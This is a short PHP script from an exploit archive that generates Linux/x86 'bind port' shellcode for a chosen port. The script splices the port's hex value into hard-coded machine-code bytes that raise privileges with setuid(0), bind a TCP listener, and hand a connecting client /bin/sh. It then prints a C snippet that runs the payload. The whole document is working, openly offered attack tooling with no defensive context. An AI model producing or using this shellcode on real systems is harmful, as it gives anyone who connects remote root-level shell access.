<?php
/*
Utility	: Generate Payload PortBind Linux/x86
Author	: Jonathan Salwan
Mail	: submit [!] shell-storm.org

	More shellcodes in => http://www.shell-storm.org/shellcode/
*/

function syntax()
	{
	echo "\nSyntax:\nroot@laptop:/# php ./payload.php <port>\n\n";
	}

function linux86bind($port)
		{
		if($port > 65535 || $port < 4100){
			echo "Erreur Port\nSelect a port between 4100 and 65535\n";
			return false;
			}

		$inser .= "\nchar shellcode[] = \n";
		$inser .= "			/* BindPort TCP/$port; Linux/x86; Gen:http://www.shell-storm.org */\n";
		$inser .= "\n";
		$inser .= "			\x22\\x31\\xc0\\x31\\xdb\\xb0\\x17\\xcd\\x80\\x31\\xdb\\xf7\\xe3\\xb0\\x66\\x53\\x43\\x53\x22\n";
		$inser .= "			\x22\\x43\\x53\\x89\\xe1\\x4b\\xcd\\x80\\x89\\xc7\\x52\\x66\\x68\\x";

		$res_port 	= base_convert($port, 10, 16);

		$length 	= strlen($res_port)-1;
		$i 		= 1;

		for($idx = 0; $idx < $length+1; $idx++)
		{
		$i++;
		if($i == 4)
		$inser .= "\\x";

		$inser .= $res_port[$idx];
		}

		$inser .= "\\x43\\x66\\x53\x22\n";
		$inser .= "			\x22\\x89\\xe1\\xb0\\x10\\x50\\x51\\x57\\x89\\xe1\\xb0\\x66\\xcd\\x80\\xb0\\x66\\xb3\\x04\x22\n";
		$inser .= "			\x22\\xcd\\x80\\x50\\x50\\x57\\x89\\xe1\\x43\\xb0\\x66\\xcd\\x80\\x89\\xd9\\x89\\xc3\\xb0\x22\n";
		$inser .= "			\x22\\x3f\\x49\\xcd\\x80\\x41\\xe2\\xf8\\x51\\x68n/sh\\x68//bi\\x89\\xe3\\x51\\x53\\x89\x22\n";
		$inser .= "			\x22\\xe1\\xb0\\x0b\\xcd\\x80\x22\x3b\n";
		$inser .= "\n";
		$inser .= "	printf(\x22Length: %d\\n\x22,strlen(shellcode));\n";
		$inser .= "	(*(void(*)()) shellcode)();\n";
		$inser .= "\n";
		$inser .= "\n";

	return $inser;
}

if($argc < 2){
	syntax();
	return false;
	}
		$port = $argv[1];
		echo linux86bind($port);

?>

# milw0rm.com [2009-06-09]